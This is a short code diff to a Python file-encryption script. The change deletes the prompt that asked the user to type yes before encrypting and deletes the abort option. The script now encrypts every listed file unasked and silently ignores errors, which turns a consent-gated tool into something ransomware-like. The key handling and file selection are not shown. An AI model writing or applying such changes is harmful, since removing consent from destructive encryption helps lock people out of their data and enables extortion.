@@ -38,15 +38,11 @@ for i in files:
     print(i)
 print("\nTHE ABOVE MENTIONED FILES WILL BE ENCRYPTED\n")
 
-choice = input("type yes to encrypt or no to quit : ")
 print("\n")
-if choice.lower() == "yes":
-    for i in files:
-        print("encrypting : ", i)
+for i in files:
+    print("encrypting : ", i)
+    try:
         encrypt_file(key_file, i)
+    except:
+        pass
 
-print("\nALL FILE ARE ENCRYPTED ")
-
-if choice.lower() == "no":
-    print("aborting the program, bye...")
-    exit()
